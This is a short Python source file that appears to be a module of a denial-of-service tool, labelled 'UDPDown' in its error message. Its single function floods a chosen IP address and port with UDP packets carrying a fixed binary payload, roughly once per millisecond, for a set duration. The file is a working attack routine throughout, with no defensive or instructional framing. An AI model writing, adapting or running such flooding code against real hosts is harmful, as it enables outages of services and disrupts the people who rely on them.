import socket
import time

def run(ip, port, duration, stop_event):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x30\x30\x30\x30\x34\x30\x30\x30"  # ejemplo binario simple
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            if stop_event.is_set():
                break
            s.sendto(payload, (ip, port))
            time.sleep(0.001)
    except Exception as e:
        print(f"[UDPDown Error] {e}")
    finally:
        s.close()
      
